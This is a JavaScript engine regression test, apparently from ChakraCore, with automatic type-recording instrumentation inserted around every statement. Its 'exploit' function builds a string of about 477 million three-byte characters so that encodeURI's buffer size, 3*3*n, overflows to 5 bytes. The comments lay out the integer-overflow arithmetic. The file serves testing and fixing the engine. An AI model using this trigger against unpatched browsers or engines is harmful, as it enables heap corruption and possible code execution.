var Inst0 = 0;
var Inst1 = 0;
var Inst2 = 0;
var Inst3 = 0;
var Inst4 = 0;
var Inst5 = 0;
var Inst6 = 0;
var Inst7 = 0;
var Inst8 = 0;
var Inst9 = 0;
var Inst10 = 0;
var Inst11 = 0;
var Inst12 = 0;
var Inst13 = 0;
var Inst14 = 0;
var Inst15 = 0;
var Inst16 = 0;
var Inst17 = 0;
var Inst18 = 0;
var Inst19 = 0;
var Inst20 = 0;
var Inst21 = 0;
var Inst22 = 0;
var Inst23 = 0;
var Inst24 = 0;
var Inst25 = 0;
var Inst26 = 0;
var Inst27 = 0;
var Inst28 = 0;
var Inst29 = 0;
var Inst30 = 0;
var Inst31 = 0;
var Inst32 = 0;
var Inst33 = 0;
var Inst34 = 0;
var Inst35 = 0;
var Inst36 = 0;
var Inst37 = 0;
var Inst38 = 0;
var Inst39 = 0;
var Inst40 = 0;
var Inst41 = 0;
var Inst42 = 0;
var Inst43 = 0;
var Inst44 = 0;
var Inst45 = 0;
var Inst46 = 0;
var Inst47 = 0;
var Inst48 = 0;
var Inst49 = 0;
var Inst50 = 0;
var Inst51 = 0;
var Inst52 = 0;
var Inst53 = 0;
 
function _TypeOfArray(a) {
	let number = true;	
	let string = true;
	for (let i = 0; i < a.length; i++) {
		if (number && (typeof a[i]) != "number") {
			number = false;	
		}
		if (string && (typeof a[i]) != "string") {
			string = false;	
		}
		if (!number && !string)
			break;
	}
	if (number)
		return "number";
	else if (string)
		return "string";
	else
		return "any";
}

function _TypeIsEqual(t1, t2) {
	return JSON.stringify(t1) === JSON.stringify(t2);
}

function _TypeOf(a, step) {
	var t;
	var type = Object.prototype.toString.call(a).slice(8, -1).toLowerCase();	
	if (type == "array") {
		t = {type : type, extra: {elemType: _TypeOfArray(a)}};
	} else if (type == "object") {
		let shape = [];
        if (step === undefined || step > 0) {
            let keys = Object.keys(a);
            let length = Math.min(100, keys.length);
		    for (let i = 0; i < length; i++) {
			    shape.push([keys[i], _TypeOf(a[keys[i]], step === undefined ? 1 : step - 1)]);	
		    }
        }
		t = {type : type, extra: {shape: shape}};
	} else {
		t = {type : type};
	} 
	return t;
}

function _RecordType(loc, a) {
	var t = _TypeOf(a);
    print("~~~TypeInfo:" + loc + ":" + JSON.stringify(t));
}
//-------------------------------------------------------------------------------------------------------
// Copyright (C) Microsoft. All rights reserved.
// Licensed under the MIT license. See LICENSE.txt file in the project root for full license information.
//-------------------------------------------------------------------------------------------------------
try { if (Inst0 <= 1000 && typeof (get_n_copies_of) != "undefined") {_RecordType("<376,391,5>",(get_n_copies_of)); Inst0++; } } catch(e) {}
function get_n_copies_of(ch, n) {
try { if (Inst1 <= 1000 && typeof (ch) != "undefined") {_RecordType("<392,394,5>",(ch)); Inst1++; } } catch(e) {}try { if (Inst2 <= 1000 && typeof (n) != "undefined") {_RecordType("<396,397,5>",(n)); Inst2++; } } catch(e) {}
try { if (Inst4 <= 1000 && typeof (Array) != "undefined") {_RecordType("<420,425,6>",(Array)); Inst4++; } } catch(e) {}
  var powers = new Array();
try { if (Inst3 <= 1000 && typeof (powers) != "undefined") {_RecordType("<407,413,6>",(powers)); Inst3++; } } catch(e) {}
try { if (Inst7 <= 1000 && typeof (ch) != "undefined") {_RecordType("<443,445,7>",(ch)); Inst7++; } } catch(e) {}
  powers[0] = ch;
try { if (Inst5 <= 1000 && typeof (powers[0]) != "undefined") {_RecordType("<431,440,7>",(powers[0])); Inst5++; } } catch(e) {}try { if (Inst6 <= 1000 && typeof (powers) != "undefined") {_RecordType("<431,437,7>",(powers)); Inst6++; } } catch(e) {}

  for (var i = 1; 1 << i < n; i++) {
try { if (Inst8 <= 1000 && typeof (i) != "undefined") {_RecordType("<459,460,9>",(i)); Inst8++; } } catch(e) {}try { if (Inst9 <= 1000 && typeof (i) != "undefined") {_RecordType("<471,472,9>",(i)); Inst9++; } } catch(e) {}try { if (Inst10 <= 1000 && typeof (n) != "undefined") {_RecordType("<475,476,9>",(n)); Inst10++; } } catch(e) {}try { if (Inst11 <= 1000 && typeof (i) != "undefined") {_RecordType("<478,479,9>",(i)); Inst11++; } } catch(e) {}
try { if (Inst14 <= 1000 && typeof (powers[i - 1]) != "undefined") {_RecordType("<501,514,10>",(powers[i - 1])); Inst14++; } } catch(e) {}try { if (Inst15 <= 1000 && typeof (powers) != "undefined") {_RecordType("<501,507,10>",(powers)); Inst15++; } } catch(e) {}try { if (Inst16 <= 1000 && typeof (i) != "undefined") {_RecordType("<508,509,10>",(i)); Inst16++; } } catch(e) {}try { if (Inst17 <= 1000 && typeof (powers[i - 1]) != "undefined") {_RecordType("<517,530,10>",(powers[i - 1])); Inst17++; } } catch(e) {}try { if (Inst18 <= 1000 && typeof (powers) != "undefined") {_RecordType("<517,523,10>",(powers)); Inst18++; } } catch(e) {}try { if (Inst19 <= 1000 && typeof (i) != "undefined") {_RecordType("<524,525,10>",(i)); Inst19++; } } catch(e) {}
    powers[i] = powers[i - 1] + powers[i - 1];
try { if (Inst12 <= 1000 && typeof (powers[i]) != "undefined") {_RecordType("<489,498,10>",(powers[i])); Inst12++; } } catch(e) {}try { if (Inst13 <= 1000 && typeof (powers) != "undefined") {_RecordType("<489,495,10>",(powers)); Inst13++; } } catch(e) {}
  }

  var out = '';
try { if (Inst20 <= 1000 && typeof (out) != "undefined") {_RecordType("<543,546,13>",(out)); Inst20++; } } catch(e) {}

  for (var i = powers.length - 1; i >= 0; i--) {
try { if (Inst21 <= 1000 && typeof (i) != "undefined") {_RecordType("<565,566,15>",(i)); Inst21++; } } catch(e) {}try { if (Inst22 <= 1000 && typeof (powers.length) != "undefined") {_RecordType("<569,582,15>",(powers.length)); Inst22++; } } catch(e) {}try { if (Inst23 <= 1000 && typeof (powers) != "undefined") {_RecordType("<569,575,15>",(powers)); Inst23++; } } catch(e) {}try { if (Inst24 <= 1000 && typeof (i) != "undefined") {_RecordType("<588,589,15>",(i)); Inst24++; } } catch(e) {}try { if (Inst25 <= 1000 && typeof (i) != "undefined") {_RecordType("<596,597,15>",(i)); Inst25++; } } catch(e) {}
try { if (Inst26 <= 1000 && typeof (i) != "undefined") {_RecordType("<616,617,16>",(i)); Inst26++; } } catch(e) {}try { if (Inst27 <= 1000 && typeof (n) != "undefined") {_RecordType("<620,621,16>",(n)); Inst27++; } } catch(e) {}
    if (1 << i > n) {
      continue;
    }

try { if (Inst29 <= 1000 && typeof (powers[i]) != "undefined") {_RecordType("<659,668,20>",(powers[i])); Inst29++; } } catch(e) {}try { if (Inst30 <= 1000 && typeof (powers) != "undefined") {_RecordType("<659,665,20>",(powers)); Inst30++; } } catch(e) {}
    out += powers[i];
try { if (Inst28 <= 1000 && typeof (out) != "undefined") {_RecordType("<652,655,20>",(out)); Inst28++; } } catch(e) {}
try { if (Inst32 <= 1000 && typeof (i) != "undefined") {_RecordType("<684,685,21>",(i)); Inst32++; } } catch(e) {}
    n -= 1 << i;
try { if (Inst31 <= 1000 && typeof (n) != "undefined") {_RecordType("<674,675,21>",(n)); Inst31++; } } catch(e) {}
  }

try { if (Inst33 <= 1000 && typeof (out) != "undefined") {_RecordType("<701,704,24>",(out)); Inst33++; } } catch(e) {}
  return out;
}

try { if (Inst34 <= 1000 && typeof (exploit) != "undefined") {_RecordType("<718,725,27>",(exploit)); Inst34++; } } catch(e) {}
function exploit() {
  // The choice of character is somewhat important -- we need
  // something that expands out to 3 bytes in UTF-8 encoding.
  // In this case, U+20AC satisfies that requirement.
  var s1 = "\u20ac";
try { if (Inst35 <= 1000 && typeof (s1) != "undefined") {_RecordType("<914,916,31>",(s1)); Inst35++; } } catch(e) {}
  var ss;
try { if (Inst36 <= 1000 && typeof (ss) != "undefined") {_RecordType("<935,937,32>",(ss)); Inst36++; } } catch(e) {}

try { if (Inst40 <= 1000 && typeof (e) != "undefined") {_RecordType("<1000,1001,36>",(e)); Inst40++; } } catch(e) {}
  try {
try { if (Inst38 <= 1000 && typeof (get_n_copies_of) != "undefined") {_RecordType("<957,972,35>",(get_n_copies_of)); Inst38++; } } catch(e) {}try { if (Inst39 <= 1000 && typeof (s1) != "undefined") {_RecordType("<973,975,35>",(s1)); Inst39++; } } catch(e) {}
    ss = get_n_copies_of(s1, 477218589);
try { if (Inst37 <= 1000 && typeof (ss) != "undefined") {_RecordType("<952,954,35>",(ss)); Inst37++; } } catch(e) {}
  } catch (e) {
try { if (Inst41 <= 1000 && typeof (print) != "undefined") {_RecordType("<1009,1014,37>",(print)); Inst41++; } } catch(e) {}
    print("You don't have enough free memory or VA to run this -- you'll need as much as possible.");
    return;
  }

try { if (Inst42 <= 1000 && typeof (print) != "undefined") {_RecordType("<1126,1131,41>",(print)); Inst42++; } } catch(e) {}try { if (Inst43 <= 1000 && typeof (ss.length) != "undefined") {_RecordType("<1149,1158,41>",(ss.length)); Inst43++; } } catch(e) {}try { if (Inst44 <= 1000 && typeof (ss) != "undefined") {_RecordType("<1149,1151,41>",(ss)); Inst44++; } } catch(e) {}
  print("SS length = " + ss.length + "<br/>"); // encodeURI sums (3 * [number of UTF-8 bytes required]) for each character
  // Since we use a char with 3 bytes required, that means the encodeURI memory
  // allocation is 3 * 3 * 477218589 = 0x100000005.
  // This truncates when fit into a ulong to just 5.

try { if (Inst45 <= 1000 && typeof (print) != "undefined") {_RecordType("<1435,1440,46>",(print)); Inst45++; } } catch(e) {}try { if (Inst46 <= 1000 && typeof (encodeURI(ss).length) != "undefined") {_RecordType("<1441,1461,46>",(encodeURI(ss).length)); Inst46++; } } catch(e) {}try { if (Inst47 <= 1000 && typeof (encodeURI) != "undefined") {_RecordType("<1441,1450,46>",(encodeURI)); Inst47++; } } catch(e) {}try { if (Inst48 <= 1000 && typeof (ss) != "undefined") {_RecordType("<1451,1453,46>",(ss)); Inst48++; } } catch(e) {}
  print(encodeURI(ss).length);
}

try { if (Inst50 <= 1000 && typeof (e) != "undefined") {_RecordType("<1495,1496,51>",(e)); Inst50++; } } catch(e) {}
try {
try { if (Inst49 <= 1000 && typeof (exploit) != "undefined") {_RecordType("<1475,1482,50>",(exploit)); Inst49++; } } catch(e) {}
  exploit();
} catch (e) {
try { if (Inst51 <= 1000 && typeof (print) != "undefined") {_RecordType("<1502,1507,52>",(print)); Inst51++; } } catch(e) {}try { if (Inst52 <= 1000 && typeof (e.message) != "undefined") {_RecordType("<1522,1531,52>",(e.message)); Inst52++; } } catch(e) {}try { if (Inst53 <= 1000 && typeof (e) != "undefined") {_RecordType("<1522,1523,52>",(e)); Inst53++; } } catch(e) {}
  print("Message: " + e.message);
}

